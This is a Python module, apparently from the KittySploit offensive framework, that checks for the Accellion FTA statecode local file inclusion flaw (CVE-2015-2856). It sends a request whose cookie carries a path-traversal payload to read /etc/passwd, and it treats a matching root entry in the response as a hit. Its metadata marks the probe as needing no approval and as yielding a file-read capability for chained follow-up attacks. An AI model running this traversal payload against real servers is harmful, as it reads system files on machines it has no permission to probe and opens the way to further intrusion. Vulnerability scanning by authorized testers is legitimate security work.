#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Accellion FTA statecode cookie file disclosure (CVE-2015-2856)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Accellion FTA - statecode LFI Detection (CVE-2015-2856)',
        'description': (
            'Detects CVE-2015-2856 by requesting /intermediate_login.html with '
            'Cookie statecode=../../../../../etc/passwd%00.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'accellion', 'fta', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2856',
        ],
        'cve': 'CVE-2015-2856',
    }

    def run(self):
        r = self.http_request(
            method='GET',
            path='/intermediate_login.html',
            headers={'Cookie': 'statecode=../../../../../etc/passwd%00'},
            allow_redirects=False,
        )
        if r and re.search(r'root:.*:0:0:', r.text or '', re.I):
            self.set_info(
                severity='high',
                reason='Accellion FTA statecode LFI (CVE-2015-2856)',
                path='/intermediate_login.html',
            )
            return True
        return False
